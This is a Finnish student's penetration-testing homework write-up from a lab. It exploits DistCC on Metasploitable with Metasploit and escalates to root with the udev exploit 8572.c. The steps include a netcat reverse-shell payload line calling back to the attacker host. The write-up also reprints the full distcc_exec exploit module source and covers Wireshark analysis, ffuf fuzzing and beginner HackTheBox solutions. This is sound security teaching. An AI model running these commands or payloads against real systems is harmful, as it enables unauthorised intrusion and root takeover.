# h3 Nuuskija

Tehtävänanto: [https://terokarvinen.com/tunkeutumistestaus/](https://terokarvinen.com/tunkeutumistestaus/)

## x) Lue ja tiivistä

Popov 2024: Hacktricks: Wireshark tricks [https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/wireshark-tricks#improve-your-wireshark-skills](https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/wireshark-tricks#improve-your-wireshark-skills)

- Analyysityökaluja: Expert Information näyttää analyysin pääkohdat; Protocol Hierarchy listaa kaikki protokollat
- Suodattimet: esim. http.request, näyttää HTTP-liikenteen
- CTRL+F hakee sisältöä

Karvinen 2023: Find Hidden Web Directories - Fuzz URLs with ffuf [https://terokarvinen.com/2023/fuzz-urls-find-hidden-directories/](https://terokarvinen.com/2023/fuzz-urls-find-hidden-directories/)
- FFUF (Fuzz Faster U Fool): nopea web-fuzzer, tunnistaa piilotettuja URL-osoitteita testaamalla automaattisesti useita URL-osoitteita -> vähemmän manuaalista työtä, enemmän tuloksia
-  FUFF käyttää sanakirjatiedostoja etsiäkseen piilotettuja URL-osoitteita tai hakemistoja
- Ohjeesta löytyy testattava kohde sekä suositus sanakirjatiedostolähteestä
- web-palvelin palauttaa HTTP-statuskoodin 200 OK kaikille URL-osoitteille, yhteisiä piirteitä ei-toivotuista vasteista voi etsiä ja suodattaa tuloksia niiden perusteella
- Suodattimia: vasteen koko (-fs), sanamäärä (-fw), rivit (-fl)
- Esim. curlilla voi tarkastaa tulokset

## a) Valitse valmis hyökkäys. Ota sellainen hyökkäys, jonka saat toimimaan omaan paikalliseen harjoitusmaaliin, kuten Metasploitableen. Demonstroi hyökkäyksen toiminta.

Googlasin hyökkäyksiä, ja löysin yhden, joka vaikutti helposti toteutettavalta sivulta [https://dev.to/atenadadkhah/hack-metasploitable-machine-in-5-ways-using-kali-linux-2h9e](https://dev.to/atenadadkhah/hack-metasploitable-machine-in-5-ways-using-kali-linux-2h9e): DISTCCD Open Port.

Avasin msfconsolen ``sudo msfconsole``, etsin hyökkäyksen ``search distccd`` ja valitsin hyökkäyksen ``use 0``. Asetin kohteeksi Metasploitablen ``set RHOSTS 192.168.56.102``.

![image](https://github.com/user-attachments/assets/c3426118-6cd5-48c9-9c7d-9bc6d98f5306)

``show payloads`` katsoin, millaisia payloadeja hyökkäyksessä pystyi käyttämään. Löytämäni ohjeen mukaan valitsin cmd/unix/reverse ``set PAYLOAD 6``, ja sitten ``run``.

Ilmoituksena tuli, että exploit suoritettu, sessiota ei luotu. Katsoin ``show options`` pitäisikö jotain muuta määrittää. Korjasin LHOST ``set LHOST 192.168.56.101``, valitsin saman payloadin ja suoritin exploitin uudelleen. Nyt pääsin sisään, mutten rootina. 

![image](https://github.com/user-attachments/assets/552fe8f1-b26f-4f6b-afc1-3bd457a3b2ca)

Miten pääsisin rootiin? Etsin Youtubesta ohjevideon [How To - Metasploitable 2 - DISTCC + Privilege Escalation](https://www.youtube.com/watch?v=DoUZFHwZntY).

Pääsin exploitilla daemon-käyttäjälle, ja silläkin pystyi antamaan tiettyjä komentoja. Seuraavaksi oli aika kaapata sudo-oikeudet.

Tarkastin päällä olevat prosessit komennolla ``ps aux``. Näistä tiedoista greppasin ``dpkg -l |grep "udev"``. Tässä on heikko kohta, jota hyödyntää sudo-oikeuksien saamiseksi.

Kalilla:
- komennolla ``searchsploit udev`` etsin udev-exploiteja exploitdb-tietokannasta. Näistä valitsin ohjeen mukaan 8572.c:n.
- Käynnistin apache2-palvelimen komennolla ``sudo systemctl start apache2``.
- Kopioin udev-exploitin toiseen kansioon ``sudo cp /usr/share/exploitdb/exploits/linux/local/8572.c /var/www/html``
- Siirryin kansioon ``cd /var/www/html/``.
- Tarkastin, että tiedosto löytyi kansiosta ``ls``.

Metasploitablessa daemonina (auki toisella komentorivillä Kalillla):
- Latasin apache-palvelimelta tiedoston ja nimesin sen msp2.c ``wget 192.168.56.101/8572.c -O msp2.c``
- Tarkistin, että tiedosto latautui ``ls``
- Loin tiedoston run ``touch run``
-Tarkistin, että tiedosto löytyi ``ls``
- run-tiedostoon lisäsin koodia ``echo '#½/bin/sh' > run`` ja ``echo '/bin/netcat -e /bin/sh 192.168.56.101 5555' >> run`` (5555 on Kalin portti, jota kautta yhteys otetaan)
- Tarkistin, että tiedostossa luki mitä kirjoitin ``cat run``: tämä tiedosto on payload, joka liitetään udev-exploitiin
- ``gcc msp2.c -o msp2`` Komennolla käännetään ohjelma ja nimetään se msp2, nyt sen voi suorittaa Linux-ympäristössä
- ``cat /proc/net/netlink`` sain prosessin Pid: 2406, tätä tarvitsee seuraavaksi

Kalilla:
- ``nc -lvnp 5555`` komennolla laitettiin netcat kuuntelemaan porttia 5555

Metasploitablessa daemonina:
- muokkasin tiedoston käyttöoikeuksia ``chmod +x msp2``
- suoritin tiedoston ``./msp2 2406``

  Nyt Kali oli root Metasploitablessa, yhteys on luotu netcatilla.

![image](https://github.com/user-attachments/assets/aef6919d-3b21-462e-84f5-3cf9b7b0145e)

En ottanut tässä kohtaa paljoa screenshotteja, koska epäilin etten onnistuisi. Kaikki meni kuitenkin ykkösellä läpi. Komennot kirjasin tehdessä kyllä.


## b) Sorsa. Selitä ja arvioi valitsemasi hyökkäyksen toimintaa lähdekoodista.

Lähdekoodin löysin ``/usr/share/metasploit-famework/modules/exploits/unix/misc/distcc_exec.rb``.

[https://www.computersecuritystudent.com/SECURITY_TOOLS/METASPLOITABLE/EXPLOIT/lesson2/index.html](https://www.computersecuritystudent.com/SECURITY_TOOLS/METASPLOITABLE/EXPLOIT/lesson2/index.html)

Hyökkäys käynnistyy, jos haavoittuvuus havaitaan def check-kohdassa echolla "echo #{r}" ->  if out && out.index(r) return Exploit::CheckCode::Vulnerable. Exploitin kriittinen osa on dist_cmd-kohta,  payload.encoded. Tässä vaiheessa payload suoritetaan etäkoneella.



```ruby

# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'DistCC Daemon Command Execution',
      'Description'    => %q{
        This module uses a documented security weakness to execute
        arbitrary commands on any system running distccd.

      },
      'Author'         => [ 'hdm' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2004-2687'],
          [ 'OSVDB', '13378' ],
          [ 'URL', 'http://distcc.samba.org/security.html'],

        ],
      'Platform'       => ['unix'],
      'Arch'           => ARCH_CMD,
      'Privileged'     => false,
      'Payload'        =>
        {
          'Space'       => 1024,
          'DisableNops' => true,
          'Compat'      =>
            {
              'PayloadType' => 'cmd cmd_bash',
              'RequiredCmd' => 'generic perl ruby bash telnet openssl bash-tcp',
            }
        },
      'Targets'        =>
        [
          [ 'Automatic Target', { }]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => '2002-02-01'
      ))

      register_options(
        [
          Opt::RPORT(3632)
        ])
  end

  def check
    r = rand_text_alphanumeric(10)
    connect
    sock.put(dist_cmd("sh", "-c", "echo #{r}"))

    dtag = rand_text_alphanumeric(10)
    sock.put("DOTI0000000A#{dtag}\n")

    err, out = read_output
    if out && out.index(r)
      return Exploit::CheckCode::Vulnerable
    end
    return Exploit::CheckCode::Safe
  end

  def exploit
    connect

    distcmd = dist_cmd("sh", "-c", payload.encoded);
    sock.put(distcmd)

    dtag = rand_text_alphanumeric(10)
    sock.put("DOTI0000000A#{dtag}\n")

    err, out = read_output

    (err || "").split("\n") do |line|
      print_status("stderr: #{line}")
    end
    (out || "").split("\n") do |line|
      print_status("stdout: #{line}")
    end

    handler
    disconnect
  end

  def read_output

    res = sock.get_once(24, 5)

    if !(res and res.length == 24)
      print_status("The remote distccd did not reply to our request")
      disconnect
      return
    end

    # Check STDERR
    res = sock.get_once(4, 5)
    res = sock.get_once(8, 5)
    len = [res].pack("H*").unpack("N")[0]

    return [nil, nil] if not len
    if (len > 0)
      err = sock.get_once(len, 5)
    end

    # Check STDOUT
    res = sock.get_once(4, 5)
    res = sock.get_once(8, 5)
    len = [res].pack("H*").unpack("N")[0]

    return [err, nil] if not len
    if (len > 0)
      out = sock.get_once(len, 5)
    end
    return [err, out]

  end


  # Generate a distccd command
  def dist_cmd(*args)

    # Convince distccd that this is a compile
    args.concat(%w{# -c main.c -o main.o})

    # Set distcc 'magic fairy dust' and argument count
    res = "DIST00000001" + sprintf("ARGC%.8x", args.length)

    # Set the command arguments
    args.each do |arg|
      res << sprintf("ARGV%.8x%s", arg.length, arg)
    end

    return res
  end
end
```



## c) Snif snif. Selitä ja arvioi valitsemasi hyökkäyksen toimintaa verkkosnifferillä. Pohdi myös, miten näkyvä tämä hyökkäys tai kontrollikanava on verkossa. (Vapaaehtoinen bonus: liitä mukaan pcap tekemästäsi nauhoituksesta).

Avasin Wiresharkin komennolla ``wireshark``. Toisella välilehdellä laitoin exploitin valmiiksi. Valitsin Wiresharkista sen verkon, jossa Kali ja Metasploitable on kaksoisklikkaamalla eth1.

![image](https://github.com/user-attachments/assets/517dc04f-6102-4325-8bc0-94e4ee79d8d8)

Suoritin exploitin run-komennolla, ja Wireshark nappasi verkkoliikennettä näiden koneiden välillä.

SYN SYN ACK -kohdissa tapahtui kolmivaiheinen kättely, TCP-yhteyksien muodostuminen. 3632 on distcc:n oletusportti. Hyökkäys alkoi yhteyden muodostamisella tähän porttiin, ja verkkosnifferi näytti yhteyden muodostumisen. Wireshark tunnisti epätavallisen distcc-paketin "Malformed packet"

![image](https://github.com/user-attachments/assets/2ce65247-fd8e-41b6-a49e-8b85ad0af29f)

![image](https://github.com/user-attachments/assets/c812133e-34af-4abe-a0b4-a889ae930e7c)





## d) Fuzzzz. Ratkaise dirfuz-1 artikkelista Karvinen 2023: Find Hidden Web Directories - Fuzz URLs with ffuf.

Latasin sivulta [https://terokarvinen.com/2023/fuzz-urls-find-hidden-directories/](https://terokarvinen.com/2023/fuzz-urls-find-hidden-directories/) targetin ja säädin käyttöoikeuksia ohjeen mukaan.

![image](https://github.com/user-attachments/assets/f59b9b07-0536-4de0-9aa4-554c023b73da)

Selaimessa näytti tältä, eli targetti oli nyt kunnossa.

![image](https://github.com/user-attachments/assets/1f04bd5b-1c22-48c7-8ac7-af2aab0ff938)

Seuraavaksi asensin ffufin.

![image](https://github.com/user-attachments/assets/5286f0ed-e464-462b-9b83-512515df6e44)

Sitten latasin sanakirjatiedoston common.txt.

![image](https://github.com/user-attachments/assets/5fa17a29-6c4f-4802-aa7b-79433ada9473)

Kokeilin ffufia, tuloksia oli piiiitkä lista.

![image](https://github.com/user-attachments/assets/a29ba838-5f0c-44d4-8788-bfd0dae30b37)


Ohjeissa oli vinkkejä suodattamiseen, ja sain haaviin kohdeosoitteen.

![image](https://github.com/user-attachments/assets/d88f73da-ef6b-4fc5-ac3f-39411d973634)

Selaimessa:

![image](https://github.com/user-attachments/assets/7a77af2c-76ca-4a27-80e3-52ee80083d16)





## d) HTB. Ratkaise 1-2 konetta HackTheBoxisssa. Voit valita omaan taitotasoon sopivat koneet.




![image](https://github.com/user-attachments/assets/2cb4027a-5af1-4c1d-9010-9a841ec1fa89)

![image](https://github.com/user-attachments/assets/338b5bc2-c9a0-4194-925c-def31ebbf92d)

Läppärini jumahti pari kertaa tässä kohtaa ja kävi kuumana. Siirryin pöytäkoneelle ja ajattelin testata suosituksen vastaisesti Pwnboxilla. 
Valitsin lokaatioksi pienimmän latenssin vaihtoehdon.

![image](https://github.com/user-attachments/assets/885e9fe1-e854-4c9e-b5b7-06a8a17f0834)

Sain IP-osoitteen ja pingasin sitä työpöydältä, paketit liikuivat.

![image](https://github.com/user-attachments/assets/848bb5da-9ea3-45f2-b0f8-e25d7a5535c4)


![image](https://github.com/user-attachments/assets/93e57ee3-7f6d-4587-890e-d2b465c1ee5a)

Porttiskannasin koneen seuraavaksi komennolla ``sudo nmap -sV 10.129.66.103``. Telnetin portti 23 oli auki.

![image](https://github.com/user-attachments/assets/3060e9c7-18a2-4705-b28a-ac131fb4dbeb)

Otin telnet-yhteyden koneeseen ``telnet 10.129.66.103``. En kuluttanut tähän kauemmin aikaa, sillä ratkaisu oli walkthrough-tiedostossa. Rootilla pääsi sisään. Lippu napattu.

![image](https://github.com/user-attachments/assets/51f54425-f1e1-4961-95c4-365e35fc9d97)

![image](https://github.com/user-attachments/assets/254201e7-31fb-468d-a3b9-f7709d6291b4)

Sitten kokeilin seuraavaa konetta, myöskin ihan aloittelijalle. Pääsee näin tutustumaan ainakin itse HTB-palveluun. Eli instanssi pystyyn, työpöytä auki ja spawn machine. Sen IP 10.129.1.14. Pingasin konetta, yhteys muodostunut. ``nmap -sV 10.129.1.14`` näkyi, että FTP:n portti 21 oli auki. ``ftp 10.129.1.14`` annoin käyttäjätunnukseksi anonymous (tämän opin tekemällä samanaikaisesti tehtäviä), salasana password arvasin). ``ls`` löytyi flag.txt, sen sai ladattua ``get flag.txt``. Lippu napattu.


![image](https://github.com/user-attachments/assets/7c99d62f-d351-4b8d-ac6e-f6b4d9c644f3)


Täytyy jatkaa myöhemmin näitä, homma sujui varsin kivuttomasti kyllä tällä työpöytäversiolla, latenssia tuskin huomasi. Aloituskoneet oli tosi helppoja kyllä. Läppärilläkin varmasti onnistuu, kunhan ei ole samaan aikaan päällä esim. kaksi virtuaalikonetta. :D




## Lähteet

Tehtävänanto: Karvinen, Tero. Tunkeutumistestaus. 10.5.2024. [https://terokarvinen.com/tunkeutumistestaus/](https://terokarvinen.com/tunkeutumistestaus/) luettu 13.11.2024.

ComputerSecurityStudent.com. Lesson 2: Metasploitable Exploit. [fromhttps://www.computersecuritystudent.com/SECURITY_TOOLS/METASPLOITABLE/EXPLOIT/lesson2/index.html](fromhttps://www.computersecuritystudent.com/SECURITY_TOOLS/METASPLOITABLE/EXPLOIT/lesson2/index.html) luettu 13.11.2024

Dadkhah, Atena. "Hack Metasploitable Machine in 5 Ways Using Kali Linux." Dev.to, 3.11.2020. [https://dev.to/atenadadkhah/hack-metasploitable-machine-in-5-ways-using-kali-linux-2h9e](https://dev.to/atenadadkhah/hack-metasploitable-machine-in-5-ways-using-kali-linux-2h9e) luettu 13.11.2024.

rwbnetsec. How To - Metasploitable 2 - DISTCC + Privilege Escalation. Youtube. 5.11.2015. [https://www.youtube.com/watch?v=DoUZFHwZntY](https://www.youtube.com/watch?v=DoUZFHwZntY) katsottu 13.11.2024.

Karvinen, Tero. Find Hidden Web Directories - Fuzz URLs with ffuf. 10.5.2023. [https://terokarvinen.com/2023/fuzz-urls-find-hidden-directories/](https://terokarvinen.com/2023/fuzz-urls-find-hidden-directories/) luettu 13.11.2024.

Hack The Box. [https://app.hackthebox.com/home](https://app.hackthebox.com/home) luettu 13.11.2024.
